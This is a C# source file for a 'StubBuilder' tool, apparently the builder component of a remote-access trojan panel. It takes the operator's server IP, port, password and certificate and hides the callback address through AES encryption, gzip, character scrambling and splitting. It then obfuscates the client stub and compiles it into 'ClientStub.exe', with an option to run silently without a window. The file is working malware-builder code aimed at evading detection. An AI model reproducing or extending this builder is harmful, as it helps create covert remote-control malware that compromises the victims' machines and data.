using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.Json;

namespace StubBuilder
{
    class Program
    {
        static void Main(string[] args)
        {
            bool testOnly = args.Contains("--test");
            string rootDir = Path.GetFullPath(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "..", "..", "..", ".."));
            string stubPath = Path.Combine(rootDir, "CSharpStub", "Stub.cs");
            string panelBuildDir = Path.Combine(rootDir, "bin", "Release", "net8.0-windows7.0");
            string certPath = Path.Combine(panelBuildDir, "server_certificate.pfx");
            string certPwdPath = Path.Combine(panelBuildDir, "server_cert_password.txt");
            string settingsPath = Path.Combine(panelBuildDir, "server_settings.json");

            Console.WriteLine("=== StubBuilder CLI ===");
            Console.WriteLine($"Root:      {rootDir}");
            Console.WriteLine($"Stub:      {stubPath}");
            Console.WriteLine($"Panel dir: {panelBuildDir}");

            if (!File.Exists(stubPath)) { Console.WriteLine("ERROR: Stub.cs not found"); return; }
            if (!File.Exists(certPath)) { Console.WriteLine("ERROR: server_certificate.pfx not found"); return; }
            if (!File.Exists(settingsPath)) { Console.WriteLine("ERROR: server_settings.json not found"); return; }

            string json = File.ReadAllText(settingsPath);
            var settings = JsonSerializer.Deserialize<JsonElement>(json);
            string password = settings.GetProperty("Password").GetString() ?? "";
            string ip = settings.GetProperty("ServerIp").GetString() ?? "127.0.0.1";
            string port = settings.GetProperty("Port").GetString() ?? "4444";
            bool silentMode = settings.TryGetProperty("SilentMode", out var sm) && sm.GetBoolean();

            Console.WriteLine($"Target:    {ip}:{port}");
            Console.WriteLine($"Silent:    {silentMode}");
            Console.WriteLine($"Password:  {new string('*', password.Length)}");

            string certPwd = File.ReadAllText(certPwdPath).Trim();
            var cert = new X509Certificate2(certPath, certPwd, X509KeyStorageFlags.Exportable);
            byte[] certBytes = cert.Export(X509ContentType.Cert);
            string certBase64 = Convert.ToBase64String(certBytes);
            Console.WriteLine($"Cert:      loaded ({certBytes.Length} bytes)");

            string stubCode = File.ReadAllText(stubPath, Encoding.UTF8);
            string url = $"{ip}:{port}";
            string obfuscated = ObfuscateUrl(url, out string aesKey, out string aesIv);
            var parts = obfuscated.Split('\u00a4');

            stubCode = stubCode
                .Replace("{{URL_PART1}}", parts[0])
                .Replace("{{URL_PART2}}", parts[1])
                .Replace("{{URL_PART3}}", parts[2])
                .Replace("{{AES_KEY}}", aesKey)
                .Replace("{{AES_IV}}", aesIv)
                .Replace("{{SERVER_URL}}", url)
                .Replace("{{CERTIFICATE}}", certBase64)
                .Replace("{{SILENT_MODE}}", silentMode ? "true" : "false")
                .Replace("{{PASSWORD}}", password);

            if (stubCode.Contains("{{") && stubCode.Contains("}}"))
            {
                Console.WriteLine("ERROR: Unreplaced placeholders remain");
                return;
            }

            Console.WriteLine("Obfuscating stub...");
            string obfDump = Path.Combine(Path.GetTempPath(), "obfuscated_stub.cs");
            var sw = System.Diagnostics.Stopwatch.StartNew();
            try
            {
                stubCode = StubObfuscator.Obfuscate(stubCode);
                File.WriteAllText(obfDump, stubCode, Encoding.UTF8);
                Console.WriteLine($"Obfuscated: {stubCode.Length} chars -> {obfDump}");
                Console.WriteLine($"Obfuscation took: {sw.ElapsedMilliseconds}ms");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"OBFUSCATION FAILED: {ex.Message}");
                Console.WriteLine(ex.StackTrace);
                return;
            }

            if (testOnly) { Console.WriteLine("Test mode — skipping build."); return; }

            string buildDir = Path.Combine(Path.GetTempPath(), "stub_build_" + Guid.NewGuid().ToString("N").Substring(0, 8));
            Directory.CreateDirectory(buildDir);
            Console.WriteLine($"Build dir: {buildDir}");

            string outputType = silentMode ? "WinExe" : "Exe";
            string csproj = $@"<Project Sdk=""Microsoft.NET.Sdk"">
  <PropertyGroup>
    <OutputType>{outputType}</OutputType>
    <TargetFramework>net472</TargetFramework>
    <LangVersion>7.3</LangVersion>
    <GenerateAssemblyInfo>false</GenerateAssemblyInfo>
    <DebugType>none</DebugType>
    <DebugSymbols>false</DebugSymbols>
    <Optimize>true</Optimize>
    <AppendTargetFrameworkToOutputPath>false</AppendTargetFrameworkToOutputPath>
    <AppendRuntimeIdentifierToOutputPath>false</AppendRuntimeIdentifierToOutputPath>
  </PropertyGroup>
  <ItemGroup>
    <Reference Include=""System.Management"" />
    <Reference Include=""System.Net.Http"" />
    <Reference Include=""System.Windows.Forms"" />
    <Reference Include=""System.Drawing"" />
    <Reference Include=""System.ServiceProcess"" />
  </ItemGroup>
</Project>";

            File.WriteAllText(Path.Combine(buildDir, "Stub.cs"), stubCode, Encoding.UTF8);
            File.WriteAllText(Path.Combine(buildDir, "Stub.csproj"), csproj, Encoding.UTF8);

            string publishDir = Path.Combine(buildDir, "out");
            Console.WriteLine("Building with dotnet...");

            var psi = new ProcessStartInfo
            {
                FileName = "dotnet",
                Arguments = $"build -c Release -o \"{publishDir}\"",
                WorkingDirectory = buildDir,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            var proc = Process.Start(psi);
            var stdout = new StringBuilder();
            var stderr = new StringBuilder();
            proc.OutputDataReceived += (s, e) => { if (e.Data != null) { stdout.AppendLine(e.Data); Console.WriteLine($"  {e.Data}"); } };
            proc.ErrorDataReceived += (s, e) => { if (e.Data != null) { stderr.AppendLine(e.Data); } };
            proc.BeginOutputReadLine();
            proc.BeginErrorReadLine();
            proc.WaitForExit(120000);

            if (proc.ExitCode != 0)
            {
                Console.WriteLine("BUILD FAILED:");
                Console.WriteLine(stderr.ToString());
                return;
            }

            string exe = Path.Combine(publishDir, "Stub.exe");
            if (!File.Exists(exe))
            {
                var found = Directory.GetFiles(publishDir, "*.exe", SearchOption.AllDirectories);
                if (found.Length > 0) exe = found[0];
                else { Console.WriteLine("ERROR: No .exe in output"); return; }
            }

            string outDir = Path.Combine(rootDir, "bin", "Release");
            Directory.CreateDirectory(outDir);
            string finalPath = Path.Combine(outDir, "ClientStub.exe");
            File.Copy(exe, finalPath, true);
            long size = new FileInfo(finalPath).Length;
            Console.WriteLine($"DONE: {finalPath} ({size / 1024.0:F1} KB)");
        }

        static string ObfuscateUrl(string url, out string keyStr, out string ivStr)
        {
            using var aes = Aes.Create();
            aes.GenerateKey(); aes.GenerateIV();
            keyStr = string.Join(", ", aes.Key.Select(b => (int)b));
            ivStr = string.Join(", ", aes.IV.Select(b => (int)b));
            var plaintext = Encoding.UTF8.GetBytes(url);
            using var encryptor = aes.CreateEncryptor();
            using var ms = new MemoryStream();
            using (var cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                cs.Write(plaintext, 0, plaintext.Length);
            var ciphertext = ms.ToArray();
            using var compressed = new MemoryStream();
            using (var gzip = new System.IO.Compression.GZipStream(compressed, System.IO.Compression.CompressionLevel.Optimal))
                gzip.Write(ciphertext, 0, ciphertext.Length);
            var scrambled = ScrambleUrl(Convert.ToBase64String(compressed.ToArray()));
            int len = scrambled.Length;
            int p1 = len / 3;
            int p2 = len * 2 / 3;
            return $"{scrambled.Substring(0, p1)}\u00a4{scrambled.Substring(p1, p2 - p1)}\u00a4{scrambled.Substring(p2)}";
        }

        static string ScrambleUrl(string s)
        {
            var sb = new StringBuilder(s.Length);
            foreach (char c in s)
            {
                if (c >= 'A' && c <= 'Z') sb.Append((char)((c - 'A' + 13) % 26 + 'A'));
                else if (c >= 'a' && c <= 'z') sb.Append((char)((c - 'a' + 13) % 26 + 'a'));
                else if (c >= '0' && c <= '9') sb.Append((char)((c - '0' + 5) % 10 + '0'));
                else if (c == '+') sb.Append('!');
                else if (c == '/') sb.Append('?');
                else if (c == '=') sb.Append('*');
                else sb.Append(c);
            }
            return sb.ToString();
        }
    }
}
